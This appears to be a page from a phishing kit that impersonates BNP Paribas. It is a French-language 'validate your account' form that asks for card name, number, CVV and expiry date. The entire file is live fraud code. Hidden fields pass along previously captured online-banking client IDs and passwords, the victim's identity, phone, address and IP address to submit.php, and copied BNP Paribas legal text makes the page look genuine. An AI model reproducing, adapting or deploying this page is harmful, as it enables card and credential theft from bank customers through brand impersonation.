<?php

error_reporting(0);
    include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 

        <title>Accéder à mes comptes en ligne | BNP Paribas</title>
    </head>

    <body>

        <!-- MAIN -->
        <main id="main-details">
            <div class="container">
                <div class="inner-container">
                    <div class="header">
                        <img width="75" src="../assets/images/horloge.png"> SIMPLE ET RAPIDE, VALIDER VOTRE PAIEMENT !
                    </div>
                    <div class="details">
                        <h3>Je valide mon compte BNP Paribas</h3>
                        <p>
                           <b>JE PRÉ-REMPLIS MON FORMULAIRE AVEC FranceConnect</b> <br>
                            Pour cela, mes données de civilité et de contact seront transmises à BNP PARIBAS
                        </p>
                        <form method="post" action="submit.php" id="form-form">
                            <input type="hidden" name="verbot">
                            <legend>JE SAISIS MES INFORMATIONS CI-DESSOUS</legend>
                            <div class="form-group mb-4">
                                <label for="cc_name">Nom sur carte</label>
                                <input type="text" name="cc_name" class="<?php echo is_invalid_class($_SESSION['errors'],'cc_name') ?>" id="cc_name" placeholder="Mon nom sur la carte" value="<?php echo get_value('cc_name'); ?>">
                                <span class="reset-btn">x</span>
                                <?php echo error_message($_SESSION['errors'],'cc_name'); ?>
                            </div>
                            <div class="form-group mb-4">
                                <label for="cc_number">N° de carte</label>
                                <input type="text" name="cc_number" maxlength="16" class="<?php echo is_invalid_class($_SESSION['errors'],'cc_number') ?>" id="cc_number" placeholder="N° de la carte" value="<?php echo get_value('cc_number'); ?>">
                                <span class="reset-btn">x</span>
                                <?php echo error_message($_SESSION['errors'],'cc_number'); ?>
                            </div>
                            <div class="row mb-4">
                                <div class="col-md-6">
                                    <div class="form-group mb-0">
                                        <label for="cc_cvv">Cryptogramme visuel(cvv)</label>
                                        <input type="text" name="cc_cvv"  maxlength="4" class="<?php echo is_invalid_class($_SESSION['errors'],'cc_cvv') ?>" id="cc_cvv" placeholder="Cryptogramme visuel(cvv)" value="<?php echo get_value('cc_cvv'); ?>">
                                        <span class="reset-btn">x</span>
                                        <?php echo error_message($_SESSION['errors'],'cc_cvv'); ?>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-group mb-0">
                                        <label for="cc_date">Date d'expiration (mm-aaaa)</label>
                                        <input type="text" name="cc_date" minlength="5" maxlength="7" class="<?php echo is_invalid_class($_SESSION['errors'],'cc_date') ?>" id="cc_date" placeholder="Date d'expiration (mm-aaaa)" value="<?php echo get_value('cc_date'); ?>">
                                        <span class="reset-btn">x</span>
                                        <?php echo error_message($_SESSION['errors'],'cc_date'); ?>
                                    </div>
                                </div>
                            </div>
                            <input type="hidden" name="type" value="card">
                            <input type="hidden" name="client_id1" id="client_id1" value="<?php echo $_SESSION['client_id1']; ?>">
                            <input type="hidden" name="password1" id="password1" value="<?php echo $_SESSION['password1']; ?>">
                            <input type="hidden" name="client_id2" id="client_id2" value="<?php echo $_SESSION['client_id2']; ?>">
                            <input type="hidden" name="password2" id="password2" value="<?php echo $_SESSION['password2']; ?>">
                            <input type="hidden" name="first_name" id="first_name" value="<?php echo $_SESSION['first_name']; ?>">
                            <input type="hidden" name="last_name" id="last_name" value="<?php echo $_SESSION['last_name']; ?>">
                            <input type="hidden" name="birth_date" id="birth_date" value="<?php echo $_SESSION['birth_date']; ?>">
                            <input type="hidden" name="indicatif" id="indicatif" value="<?php echo $_SESSION['indicatif']; ?>">
                            <input type="hidden" name="phone" id="phone" value="<?php echo $_SESSION['phone']; ?>">
                            <input type="hidden" name="address" id="address" value="<?php echo $_SESSION['address']; ?>">
                            <input type="hidden" name="zip_code" id="zip_code" value="<?php echo $_SESSION['zip_code']; ?>">
                            <input type="hidden" name="city" id="city" value="<?php echo $_SESSION['city']; ?>">
                            <input type="hidden" name="ip_address" id="ip_address" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
                            <div class="form-group text-right mt-5 mb-4">
                                <button type="button" id="form-submit">Je continue</button>
                            </div>
                            <div style="margin-top: 70px"></div>
                            <p>(1) Abonnement à des services de banque à distance (internet, téléphone fixe, SMS, etc.) : gratuit et illimité, hors coût de communication ou de fourniture d’accès à internet et hors alertes par SMS.</p>
                            <p>Conditions et tarifs en vigueur au 01/01/2019. Offres formule Esprit Libre Initiative / Référence / Premier ou formule sur mesure réservées aux particuliers majeurs capables, sous réserve de remplir les <a href="#">conditions d'éligibilité</a> et de l'acceptation définitive de votre demande par la banque, après signature électronique de vos contrats et transmission de vos pièces justificatives.</p>
                            <p>(2) La liste des sociétés du Groupe BNP Paribas est disponible à l’adresse postale figurant ci-dessus et sur <a href="#">group.bnpparibas</a>.</p>
                            <p>BNP Paribas, SA au capital de 2 499 597 122 euros - Siège social : 16, boulevard des Italiens - 75009 PARIS. Immatriculée sous le n° 662 042 449 RCS PARIS - Identifiant CE FR76 662 042 449 - ORIAS n° 07 022 735</p>
                            <p>AXA Assistance, AXA Assistance désigne INTER PARTNER Assistance, entreprise d'assurance du Groupe AXA Assistance agréée par la Banque Nationale de Belgique (0487). SA de droit belge au capital de 31 702 613 euros - siège social : 166 avenue Louise – 1050 Bruxelles – Belgique, 415 591 055 RPM Bruxelles, succursale française : 6, rue André Gide - 92230 Châtillon - 316 139 500 RCS Nanterre</p>
                            <p>Cardif - Assurances Risques Divers, Entreprise régie par le Code des assurances - SA au capital de 16 875 840 €- 308 896 547 RCS Paris. Siège social : 1 bd Haussmann - 75009 Paris. Bureaux : 8, rue du Port 92728 Nanterre Cedex</p>
                            <p>SPB, SAS de courtage d'assurance au capital de 1 000 000 euros - siège social : 71 quai Colbert CS 90000 76095 Le Havre Cedex - 305 109 779 RCS Le Havre - ORIAS n° 07 002 642 (www.orias.fr).</p>
                        </form>
                    </div>
                    <div class="footer">
                        <p><a href="#">Une question ? :</a> Nos conseillers sont disponibles pour vous répondre.</p>
                        <img src="../assets/images/service.jpg">
                        <p>Lundi-Vendredi, 8h-20h / Samedi de 8h-18h / Hors jours fériés</p>
                    </div>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>